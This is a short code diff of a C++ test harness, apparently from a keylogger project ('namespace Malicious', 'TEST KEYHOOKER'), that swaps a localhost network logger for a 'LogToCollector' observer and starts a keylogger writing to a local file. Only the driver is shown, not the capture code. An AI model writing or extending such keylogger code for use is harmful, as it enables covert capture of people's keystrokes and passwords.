@@ -10,10 +10,10 @@ using namespace Malicious;
 
 int main()
 {
-    FUNC_LOG(__FUNCTION__);
+    TRACE_FUNCTION
 	LOG.setHeader("TEST KEYHOOKER");
     LOG.addObserver(new Common::LogToConsole);
-    LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));
+    LOG.addObserver(new Common::LogToCollector);
     Keylogger::instance().setKeylog("C:\\innocence\\output.txt");
     Keylogger::instance().start();
 	system("pause");
